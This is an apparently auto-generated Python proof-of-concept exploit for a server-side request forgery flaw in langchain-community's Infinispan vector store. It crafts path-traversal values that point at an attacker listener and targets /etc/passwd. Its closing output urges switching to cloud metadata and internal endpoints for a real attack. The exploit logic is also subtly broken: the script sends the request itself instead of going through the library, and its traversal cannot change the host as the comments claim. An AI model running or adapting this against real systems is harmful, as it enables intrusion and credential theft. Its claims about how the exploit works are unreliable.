#!/usr/bin/env python3
# PoC for langchain-community-only (/tmp/langchain-community-only)
# Path: ssrf-012
# Sink: post
# Auto-generated — run with: python3 ssrf_url_concatenating_self_post.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept: SSRF in langchain-community-only Infinispan vector store

Vulnerability: The `post` method in InfinispanVS constructs a URL by concatenating
`self._default_node`, `self._cache_url`, and user-controlled `cache_name` and `key`
parameters without validation. An attacker can inject path traversal or control the
host/scheme, and `requests` follows redirects by default, enabling SSRF to internal
services or cloud metadata endpoints.

This PoC demonstrates the exploit by sending a request to an attacker-controlled
server (or localhost) via path traversal in the `cache_name` parameter.
"""

import requests
import sys
import json
from typing import Optional

# ===== CONFIGURATION =====
# Target Infinispan server (default node)
TARGET_HOST = "http://localhost:11222"  # Default Infinispan REST port
# Cache URL path (as used in the sink)
CACHE_URL = "/rest/v2/caches"
# Attacker-controlled server to receive the SSRF request (e.g., your listener)
ATTACKER_SERVER = "http://127.0.0.1:9999"  # Change to your listener
# Benign payload: attempt to read /etc/passwd (safe, no modification)
PAYLOAD_PATH = "/etc/passwd"
# =========================

def exploit_ssrf(target_host: str, cache_url: str, attacker_server: str, payload_path: str) -> Optional[requests.Response]:
    """
    Exploit the SSRF by injecting path traversal into cache_name.
    The URL becomes: target_host + cache_url + '/' + cache_name + '/' + key
    We set cache_name to something like '../../../../' to traverse out and
    then redirect to attacker_server, or directly inject a full URL if possible.
    """
    # Construct a cache_name that will cause the final URL to point to attacker_server
    # Since the URL is built as: base + "/" + cache_name + "/" + key
    # We can use path traversal to go up and then specify a new host.
    # Example: cache_name = "../../../" + attacker_server + "/"
    # This yields: base/cache_url/../../../attacker_server//key
    # Which resolves to: attacker_server/key (if base is http://host:port/path)
    # For simplicity, we use a direct path traversal to localhost.
    
    # We'll use a cache_name that makes the request go to attacker_server
    # by traversing up enough directories.
    # Assuming base is like "http://localhost:11222/rest/v2/caches"
    # We need to go up 4 levels to reach root: ../../../../ 
    # Then append attacker_server path.
    traversal = "../../../.."
    cache_name = f"{traversal}{attacker_server}/"
    key = payload_path.lstrip("/")  # Remove leading slash to avoid double slash
    
    # Build the URL as the sink does
    api_url = target_host + cache_url + "/" + cache_name + "/" + key
    print(f"[*] Constructed URL: {api_url}")
    
    # Data payload (arbitrary JSON)
    data = json.dumps({"test": "poc"})
    
    try:
        # Send POST request (as in the sink)
        response = requests.post(
            api_url,
            data=data,
            headers={"Content-Type": "application/json"},
            timeout=10,
            allow_redirects=True  # Default, follows redirects
        )
        print(f"[+] Request sent. Status: {response.status_code}")
        print(f"[+] Response headers: {dict(response.headers)}")
        print(f"[+] Response body (first 500 chars): {response.text[:500]}")
        return response
    except requests.exceptions.ConnectionError as e:
        print(f"[-] Connection error: {e}")
        print("[*] Make sure the target server is running and reachable.")
    except requests.exceptions.Timeout:
        print("[-] Request timed out.")
    except Exception as e:
        print(f"[-] Unexpected error: {e}")
    return None

def main():
    print("=" * 60)
    print("SSRF PoC for langchain-community InfinispanVS")
    print("=" * 60)
    print(f"[*] Target: {TARGET_HOST}")
    print(f"[*] Attacker server: {ATTACKER_SERVER}")
    print(f"[*] Payload path: {PAYLOAD_PATH}")
    print()
    
    # Start a simple HTTP server to catch the SSRF (optional, for demonstration)
    # In a real attack, you'd have a listener at ATTACKER_SERVER.
    print("[*] Attempting SSRF...")
    response = exploit_ssrf(TARGET_HOST, CACHE_URL, ATTACKER_SERVER, PAYLOAD_PATH)
    
    if response:
        print("\n[+] Exploit completed. Check your attacker server for incoming request.")
    else:
        print("\n[-] Exploit failed. Check connectivity and target.")
    
    print("\n[*] Note: For a real attack, replace ATTACKER_SERVER with your listener")
    print("[*] and PAYLOAD_PATH with internal endpoints like:")
    print("[*]   - http://169.254.169.254/latest/meta-data/ (AWS metadata)")
    print("[*]   - http://127.0.0.1:8080/ (internal service)")

if __name__ == "__main__":
    main()
